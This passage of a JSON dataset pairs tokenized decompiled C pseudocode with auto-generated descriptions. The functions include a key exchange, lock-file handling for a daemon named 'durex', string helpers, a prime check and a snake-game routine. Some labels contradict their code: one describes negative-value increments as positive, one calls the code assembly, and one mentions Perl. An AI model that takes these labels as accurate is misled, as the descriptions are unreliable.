            "The function \"ature\" appears to be involved in the manipulation and management of Perl code, possibly related to handling subroutine references, anonymous subroutines, and method definitions, as indicated by the defined constants and the nature of the code snippets."
        ],
        "longer_label": "The code implements a key exchange mechanism, including signature comparison, random number generation, prime number checking, and writing data to a file descriptor, potentially related to Perl code handling subroutine references and method definitions."
    },
    {
        "id": 121,
        "docstring_tokens": [
            "The",
            "function",
            "initializes",
            "key",
            "values",
            "for",
            "a",
            "client",
            ",",
            "setting",
            "various",
            "variables",
            "to",
            "zero",
            "and",
            "a",
            "constant",
            "value",
            "for",
            "'",
            "g",
            "'",
            "while",
            "logging",
            "the",
            "initialization",
            "process",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v1",
            ";",
            "__int64",
            "result",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Initalisation of keys...\"",
            ")",
            ";",
            "v1",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "srand",
            "(",
            "v1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            "=",
            "5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "40",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "48",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "56",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "result",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "64",
            ")",
            "=",
            "0",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code initializes a key structure at the address `a1`, sets certain values within that structure, seeds the random number generator with the current time, and logs an informational message using a daemon_report function."
    },
    {
        "id": 122,
        "docstring_tokens": [
            "The",
            "code",
            "handles",
            "the",
            "reception",
            "and",
            "generation",
            "of",
            "public",
            "and",
            "shared",
            "keys",
            "between",
            "a",
            "server",
            "and",
            "client",
            ",",
            "generating",
            "a",
            "shared",
            "key",
            "based",
            "on",
            "received",
            "keys",
            "and",
            "sending",
            "signatures",
            "between",
            "them",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "size_t",
            "v3",
            ";",
            "size_t",
            "v4",
            ";",
            "char",
            "*",
            "s",
            ";",
            "void",
            "*",
            "v6",
            ";",
            "void",
            "*",
            "ptr",
            ";",
            "char",
            "*",
            "v8",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "56",
            ")",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Get Pkey Y from the client\"",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "56",
            ")",
            "=",
            "ft_atollu",
            "(",
            "a1",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Generate signature...\"",
            ")",
            ";",
            "v8",
            "=",
            "(",
            "char",
            "*",
            ")",
            "ft_itoa_a",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "48",
            ")",
            "-",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "56",
            ")",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "v8",
            ")",
            ";",
            "v4",
            "=",
            "strlen",
            "(",
            "v8",
            ")",
            ";",
            "if",
            "(",
            "write",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a2",
            ",",
            "v8",
            ",",
            "v4",
            ")",
            "<",
            "=",
            "0",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "free",
            "(",
            "v8",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Signature send.\"",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "32",
            ")",
            "=",
            "powmodp",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "56",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "40",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Shared key created :\"",
            ")",
            ";",
            "v6",
            "=",
            "(",
            "void",
            "*",
            ")",
            "ft_itoa_a",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "32",
            ")",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v6",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "v6",
            ")",
            ";",
            "free",
            "(",
            "v6",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Recving public key P ... buf = \"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "a1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            "=",
            "ft_atollu",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"error c->p == 0\"",
            ")",
            ";",
            "return",
            "4294967294L",
            "L",
            ";",
            "}",
            "ptr",
            "=",
            "(",
            "void",
            "*",
            ")",
            "ft_itoa_a",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Public key P recved.\"",
            ")",
            ";",
            "if",
            "(",
            "ptr",
            ")",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "40",
            ")",
            "=",
            "0x111EA1BFDB0A2CDL",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "48",
            ")",
            "=",
            "powmodp",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "24",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "40",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ")",
            ";",
            "s",
            "=",
            "(",
            "char",
            "*",
            ")",
            "ft_itoa_a",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "48",
            ")",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "s",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Sending generated public key X\"",
            ")",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "if",
            "(",
            "write",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a2",
            ",",
            "s",
            ",",
            "v3",
            ")",
            "<",
            "=",
            "0",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "s",
            ")",
            ";",
            "free",
            "(",
            "s",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Public key X send.\"",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "32",
            ")",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "64",
            ")",
            "=",
            "1",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `_atoll` is likely a custom implementation of the standard `atoll` function, used to convert a string representation of a number to a `long long` integer, with additional logging and debugging features.",
            "The function `ft_itoa` is likely designed to convert an integer into a string representation, as demonstrated in the code snippets where it's used to convert altitude values (`prms->clr_h_max` and `prms->clr_h_min`) to strings for display purposes.",
            "The function `strlen` is used to calculate the length of a null-terminated string (C-string) in the provided code snippets, employing various typedefs, macros, and custom implementations of standard library functions for memory manipulation and string length determination."
        ],
        "longer_label": "The given code snippet is a function designed for handling key exchange and cryptographic operations, involving sending and receiving public keys, generating and sending signatures, and calculating a shared key using custom implementations of cryptographic functions and logging utilities."
    },
    {
        "id": 123,
        "docstring_tokens": [
            "The",
            "code",
            "generates",
            "a",
            "random",
            "64-bit",
            "unsigned",
            "integer",
            "by",
            "combining",
            "multiple",
            "random",
            "numbers",
            "generated",
            "by",
            "the",
            "rand",
            "(",
            ")",
            "function",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "i",
            ";",
            "__int64",
            "v2",
            ";",
            "v2",
            "=",
            "0L",
            "L",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "63",
            ";",
            "i",
            "+",
            "=",
            "30",
            ")",
            "v2",
            "=",
            "(",
            "v2",
            "<",
            "<",
            "31",
            ")",
            "+",
            "rand",
            "(",
            ")",
            ";",
            "return",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code generates a 64-bit random unsigned integer by iteratively shifting the current value left by 31 bits and adding a new random integer value generated by the `rand()` function, repeating this process 3 times to fill up the 64-bit integer."
    },
    {
        "id": 124,
        "docstring_tokens": [
            "The",
            "update_apples",
            "(",
            ")",
            "function",
            "iterates",
            "through",
            "the",
            "board",
            "and",
            "increments",
            "any",
            "negative",
            "values",
            "by",
            "1",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "*",
            "v0",
            ";",
            "int",
            "*",
            "v1",
            ";",
            "v0",
            "=",
            "&",
            "board",
            "[",
            "50",
            "]",
            ";",
            "do",
            "{",
            "v1",
            "=",
            "v0",
            "-",
            "50",
            ";",
            "do",
            "{",
            "if",
            "(",
            "*",
            "v1",
            "<",
            "0",
            ")",
            "+",
            "+",
            "*",
            "v1",
            ";",
            "+",
            "+",
            "v1",
            ";",
            "}",
            "while",
            "(",
            "v1",
            "!",
            "=",
            "v0",
            ")",
            ";",
            "v0",
            "=",
            "v1",
            "+",
            "50",
            ";",
            "}",
            "while",
            "(",
            "v1",
            "+",
            "50",
            "!",
            "=",
            "&",
            "board",
            "[",
            "1300",
            "]",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code iterates through elements of the `board` array, incrementing positive values by 1 within a specific range."
    },
    {
        "id": 125,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "a",
            "given",
            "number",
            "is",
            "a",
            "prime",
            "number",
            "and",
            "returns",
            "1",
            "if",
            "it",
            "is",
            "prime",
            ",",
            "and",
            "0",
            "if",
            "it",
            "is",
            "not",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "int",
            "i",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "1",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "(",
            "a1",
            "&",
            "1",
            ")",
            "=",
            "=",
            "0",
            "&",
            "&",
            "a1",
            ">",
            "2",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "for",
            "(",
            "i",
            "=",
            "3",
            ";",
            "i",
            "<",
            "a1",
            "/",
            "2",
            ";",
            "i",
            "+",
            "=",
            "2",
            ")",
            "{",
            "if",
            "(",
            "!",
            "(",
            "a1",
            "%",
            "i",
            ")",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "return",
            "1L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named is_prime, which takes an integer input and returns 1 if the input is a prime number, and 0 otherwise, utilizing bitwise AND operations and a loop to check divisibility."
    },
    {
        "id": 126,
        "docstring_tokens": [
            "The",
            "function",
            "ft_isdigit",
            "returns",
            "1",
            "if",
            "the",
            "input",
            "character",
            "is",
            "a",
            "digit",
            ",",
            "otherwise",
            "it",
            "returns",
            "0",
            "."
        ],
        "code_tokens": [
            "_BOOL8",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "return",
            "a1",
            ">",
            "47",
            "&",
            "&",
            "a1",
            "<",
            "=",
            "57",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `ft_isdig` appears to be intended to check whether a character is a digit (0-9) in the ASCII character set, as it is referenced within code snippets where validation of numerical input is necessary."
        ],
        "longer_label": "The provided code defines a function, `ft_isdigit`, designed to check if an input integer corresponds to a digit character in the ASCII character set, primarily for validating numerical input in code snippets."
    },
    {
        "id": 127,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "ft_atollu",
            "that",
            "converts",
            "a",
            "string",
            "to",
            "an",
            "unsigned",
            "64-bit",
            "integer",
            ",",
            "skipping",
            "any",
            "leading",
            "whitespace",
            "characters",
            ",",
            "handling",
            "negative",
            "or",
            "positive",
            "signs",
            ",",
            "and",
            "checking",
            "for",
            "string",
            "length",
            "limits",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "char",
            "*",
            "s",
            ";",
            "__int64",
            "v3",
            ";",
            "s",
            "=",
            "a1",
            ";",
            "if",
            "(",
            "!",
            "a1",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "v3",
            "=",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "*",
            "s",
            "=",
            "=",
            "32",
            "|",
            "|",
            "*",
            "s",
            "=",
            "=",
            "9",
            "|",
            "|",
            "*",
            "s",
            "=",
            "=",
            "10",
            "|",
            "|",
            "*",
            "s",
            "=",
            "=",
            "11",
            "|",
            "|",
            "*",
            "s",
            "=",
            "=",
            "13",
            "|",
            "|",
            "*",
            "s",
            "=",
            "=",
            "12",
            ")",
            "+",
            "+",
            "s",
            ";",
            "if",
            "(",
            "*",
            "s",
            "=",
            "=",
            "45",
            "|",
            "|",
            "*",
            "s",
            "=",
            "=",
            "43",
            ")",
            "+",
            "+",
            "s",
            ";",
            "while",
            "(",
            "*",
            "s",
            "=",
            "=",
            "48",
            ")",
            "+",
            "+",
            "s",
            ";",
            "if",
            "(",
            "strlen",
            "(",
            "s",
            ")",
            ">",
            "0x14",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "ft_isdigit",
            "(",
            "*",
            "s",
            ")",
            "&",
            "&",
            "*",
            "s",
            ")",
            "v3",
            "=",
            "10",
            "*",
            "v3",
            "+",
            "*",
            "s",
            "+",
            "+",
            "-",
            "48",
            ";",
            "return",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function `ft_atollu` designed to convert a string to a 64-bit unsigned integer, skipping leading whitespace characters, handling optional leading sign characters ('+' or '-'), and returning 0 if the string contains non-digit characters or exceeds a length of 20 characters."
    },
    {
        "id": 128,
        "docstring_tokens": [
            "This",
            "function",
            "copies",
            "up",
            "to",
            "n",
            "characters",
            "from",
            "src",
            "to",
            "dst",
            "and",
            "appends",
            "null",
            "characters",
            "to",
            "ensure",
            "the",
            "destination",
            "string",
            "is",
            "null",
            "terminated",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "unsigned",
            "__int64",
            "a3",
            ")",
            "{",
            "__int64",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "i",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "a3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "i",
            ")",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "i",
            ")",
            ";",
            "while",
            "(",
            "i",
            "<",
            "a3",
            ")",
            "{",
            "v3",
            "=",
            "i",
            "+",
            "+",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "v3",
            ")",
            "=",
            "0",
            ";",
            "}",
            "return",
            "a1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `strncpy` function is utilized to copy characters from one string to another with a specified maximum length, ensuring no more than the specified length is copied and allowing the possibility of appending a null terminator."
        ],
        "longer_label": "The provided code is a custom implementation of the `strncpy` function, copying characters from one string to another with a specified maximum length and ensuring a null terminator is appended if necessary."
    },
    {
        "id": 129,
        "docstring_tokens": [
            "This",
            "function",
            "calculates",
            "the",
            "length",
            "of",
            "a",
            "string",
            "in",
            "increments",
            "of",
            "16",
            "characters",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v2",
            ";",
            "v2",
            "=",
            "0",
            ";",
            "do",
            "{",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "int",
            ")",
            "v2",
            "+",
            "a1",
            ")",
            "&",
            "&",
            "v2",
            ")",
            "break",
            ";",
            "v2",
            "+",
            "=",
            "16",
            ";",
            "}",
            "while",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "int",
            ")",
            "v2",
            "+",
            "a1",
            ")",
            ")",
            ";",
            "return",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The strlen function is used to determine the length of a given string in characters."
        ],
        "longer_label": "The provided code is an optimized version of the strlen function written in assembly language, designed to determine the length of a string in characters by incrementing the index by 16 bytes until it encounters a null terminator, returning the total length."
    },
    {
        "id": 130,
        "docstring_tokens": [
            "The",
            "function",
            "ft_strncatz",
            "copies",
            "up",
            "to",
            "n",
            "characters",
            "from",
            "src",
            "to",
            "the",
            "end",
            "of",
            "dest",
            "string",
            "and",
            "returns",
            "the",
            "modified",
            "dest",
            "string",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "unsigned",
            "__int64",
            "a3",
            ")",
            "{",
            "unsigned",
            "__int64",
            "i",
            ";",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "(",
            "int",
            ")",
            "ft_strlen_16",
            "(",
            "a1",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "a3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "i",
            "+",
            "v6",
            "+",
            "a1",
            ")",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "i",
            ")",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "i",
            "+",
            "v6",
            "+",
            "a1",
            ")",
            "=",
            "0",
            ";",
            "return",
            "a1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `strncat` function appends at most `n` characters from the source string to the end of the destination string, ensuring null-termination and preventing buffer overflow.",
            "The `strlen` function calculates the length of a null-terminated string in C, implemented here with optimizations and typedefs for data types."
        ],
        "longer_label": "The provided code is an optimized implementation of a function similar to `strncat` in C, which appends at most `a3` characters from the source string (`a2`) to the end of the destination string (`a1`), ensuring null-termination and preventing buffer overflow, returning the modified destination string (`a1`)."
    },
    {
        "id": 131,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "and",
            "opens",
            "a",
            "lock",
            "file",
            ",",
            "acquires",
            "a",
            "lock",
            "on",
            "the",
            "file",
            "using",
            "flock",
            ",",
            "and",
            "stores",
            "the",
            "file",
            "descriptor",
            "in",
            "a",
            "global",
            "variable",
            "g_durex.lock",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "unsigned",
            "int",
            "fd",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Creating/Opening lock file...\"",
            ")",
            ";",
            "fd",
            "=",
            "open",
            "(",
            "\"/var/lock/durex.lock\"",
            ",",
            "64",
            ",",
            "384L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to create/open lock file.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Lock file created/opened.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Acquiring lock on file...\"",
            ")",
            ";",
            "if",
            "(",
            "flock",
            "(",
            "fd",
            ",",
            "6",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to acquire lock.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Lock acquired.\"",
            ")",
            ";",
            "result",
            "=",
            "fd",
            ";",
            "g_durex",
            "[",
            "1",
            "]",
            "=",
            "fd",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function `set_lock()` which creates or opens a lock file, acquires a lock on the file using `flock()`, and returns the file descriptor, with potential error handling and logging."
    },
    {
        "id": 132,
        "docstring_tokens": [
            "The",
            "code",
            "releases",
            "and",
            "removes",
            "a",
            "lock",
            "file",
            ",",
            "returning",
            "-1",
            "if",
            "there",
            "are",
            "any",
            "errors",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "if",
            "(",
            "g_durex",
            "[",
            "1",
            "]",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to retreive lock file fd.\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Releasing lock file...\"",
            ")",
            ";",
            "if",
            "(",
            "flock",
            "(",
            "g_durex",
            "[",
            "1",
            "]",
            ",",
            "8",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to release lock.\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Lock released.\"",
            ")",
            ";",
            "close",
            "(",
            "g_durex",
            "[",
            "1",
            "]",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Removing lock file...\"",
            ")",
            ";",
            "if",
            "(",
            "unlink",
            "(",
            "\"/var/lock/durex.lock\"",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to unlink lock file.\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Lock file removed.\"",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"close\" function likely serves to close file descriptors and clean up resources allocated in the preceding code, including managing memory mapped files, directory handling, and potentially other I/O operations, ensuring proper termination of file-related operations."
        ],
        "longer_label": "The provided code is a function to release and remove a lock file, handling potential errors and reporting status messages, with the \"close\" function likely involved in cleaning up resources, including file descriptors, after releasing the lock."
    },
    {
        "id": 133,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "a",
            "given",
            "string",
            "is",
            "empty",
            "or",
            "contains",
            "only",
            "spaces",
            ",",
            "returning",
            "1",
            "if",
            "empty",
            "or",
            "only",
            "containing",
            "spaces",
            "and",
            "0",
            "otherwise",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "size_t",
            "v2",
            ";",
            "size_t",
            "v3",
            ";",
            "if",
            "(",
            "!",
            "a1",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "v2",
            "=",
            "0L",
            "L",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "a1",
            ")",
            ";",
            "while",
            "(",
            "v2",
            "<",
            "v3",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "[",
            "v2",
            "]",
            "&",
            "&",
            "a1",
            "[",
            "v2",
            "]",
            "!",
            "=",
            "32",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "+",
            "+",
            "v2",
            ";",
            "}",
            "return",
            "1L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"strlen\" function is implemented to determine the length of a given string by iterating through its characters until the null terminator is encountered, enabling efficient string length computation in C code."
        ],
        "longer_label": "The provided code defines a function named `strempty` which returns 1 if the input string is empty or consists only of spaces, otherwise returns 0, utilizing the `strlen` function to determine the length of the input string."
    },
    {
        "id": 134,
        "docstring_tokens": [
            "The",
            "signal_handler",
            "function",
            "handles",
            "the",
            "SIGINT",
            "signal",
            "by",
            "writing",
            "an",
            "informational",
            "message",
            ",",
            "disconnecting",
            "from",
            "the",
            "host",
            ",",
            "and",
            "exiting",
            "with",
            "success",
            "."
        ],
        "code_tokens": [
            "void",
            "__noreturn",
            "FUN0",
            "(",
            ")",
            "{",
            "write",
            "(",
            "1",
            ",",
            "\"\\nCtrl+C signal caught !\\n\"",
            ",",
            "0x18uL",
            "L",
            ")",
            ";",
            "disconnect_host",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `handler` function is declared but not fully defined within the provided code snippets, suggesting it serves as an external declaration for a function that likely handles signals or exceptions, possibly related to managing errors, exceptions, or signal events within a larger software system or operating environment.",
            "Based on the function name \"disconnect_hostexit\" and the absence of code snippets, it appears this function is intended to handle the disconnection or exit behavior of a host within a larger system or application."
        ],
        "longer_label": "The provided code snippet defines a signal handler function named `signal_handler` which catches the Ctrl+C signal, prints a message, disconnects the host, and exits the program."
    },
    {
        "id": 135,
        "docstring_tokens": [
            "This",
            "code",
            "draws",
            "a",
            "game",
            "board",
            "using",
            "characters",
            "based",
            "on",
            "the",
            "values",
            "in",
            "a",
            "2D",
            "array",
            ",",
            "displaying",
            "a",
